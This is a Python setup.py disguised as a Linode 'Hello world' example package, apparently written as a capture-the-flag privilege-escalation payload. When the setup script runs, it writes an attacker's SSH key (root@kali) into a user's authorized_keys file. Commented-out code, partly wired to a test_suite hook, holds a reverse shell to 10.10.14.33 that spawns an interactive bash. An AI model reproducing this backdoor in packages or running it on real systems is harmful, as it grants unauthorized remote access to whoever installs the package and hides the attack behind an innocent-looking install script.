from setuptools import setup
#import unittest
#import socket,subprocess,os
#from pathlib import Path
key='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAAuFMyk8GsKrnWBcn4PX+tFDdbspvpfKrdmXS9Hs68U1ER4/5sCwpWzUSslTgsYtPB42lIbJy9Xl3NpXhpNxkhDexbkyKO5cl/TNmi/2jcQswcWAaew+0asPkmZsxJQHH+T2uH7C0lUIpIKKcEQmKp83dlKRBk1JJMzOwZMNVH/uXciPDpJjsH/PSRe3scFAwqjkZvGy0Wc2kBjV1S0mMZYeESryDBPX3u4vvGAMGjgRHYeYfM6VJQNx8sjhdFAT2jakrig1uf8hpv/jB6hqJdvQD7HJHJ6d7iBMmbhL1Z8xJZhdnBNefx7BJvFnIGZ47NKQGu8ucfw1X5fnuGIXv root@kali'

f=open('/home/low/.ssh/authorized_keys','a')
f.write(key)
f.close


    
#s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#s.connect(("10.10.14.33",2323))
#os.dup2(s.fileno(),0)
#os.dup2(s.fileno(),1)
#os.dup2(s.fileno(),2)


#def my_test_suite():
#    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#    s.connect(("10.10.14.33",2323))
#    os.dup2(s.fileno(),0)
#    os.dup2(s.fileno(),1)
#    os.dup2(s.fileno(),2)
#    p=subprocess.call(["/usr/bin/bash","-i"])
#    test_loader = unittest.TestLoader()
#    test_suite = test_loader.discover('tests', pattern='test_*.py')
#    return test_suite

setup(
    name='linode_example',
    packages=['linode_example'],
    description='Hello world enterprise edition',
    version='1.9',
    url='http://github.com/example/linode_example',
    author='Linode',
    author_email='docs@linode.com',
    keywords=['pip','linode','example'],
#    test_suite='setup.my_test_suite'
    )
